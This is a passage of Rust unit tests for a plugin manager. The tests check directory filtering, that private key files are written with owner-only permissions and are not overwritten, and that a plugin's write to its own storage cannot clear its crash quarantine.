        for d in ["real.plugin", "a.staging", "a.prev", "a.data-keep"] {
            fs::create_dir_all(home.path().join("plugins").join(d)).unwrap();
        }
        assert_eq!(mgr.list(), vec!["real.plugin".to_string()]);
    }

    #[test]
    fn private_keys_are_never_readable_by_others_even_briefly() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("k");
        write_private_new(&path, &[1u8; 32]).unwrap();
        assert_eq!(
            fs::metadata(&path).unwrap().permissions().mode() & 0o777,
            0o600
        );
        // Never overwrites an existing key.
        assert!(write_private_new(&path, &[2u8; 32]).is_err());
        assert_eq!(fs::read(&path).unwrap(), vec![1u8; 32]);
    }

    #[test]
    fn a_plugin_cannot_clear_its_own_crash_log_through_its_storage() {
        let home = tempfile::tempdir().unwrap();
        let mgr = PluginManager::new(home.path());
        let src = tempfile::tempdir().unwrap();
        let pkg = make_pkg(src.path(), "org.test.quarantine", "1.0.0", true);
        mgr.install(&pkg, &trusted()).unwrap();
        for _ in 0..3 {
            mgr.record_crash("org.test.quarantine").unwrap();
        }
        assert!(matches!(
            mgr.launch_permitted("org.test.quarantine"),
            Err(LifecycleError::Quarantined(_, 3))
        ));
        // The only thing a plugin can write is its own key-value store. It tries the crash log.
        let storage = PluginStorage::open(home.path(), "org.test.quarantine").unwrap();
        storage.kv_set("crashlog", "[]").unwrap();
        assert!(
            matches!(
                mgr.launch_permitted("org.test.quarantine"),
                Err(LifecycleError::Quarantined(_, 3))
            ),
            "quarantine must hold"
        );
    }
}
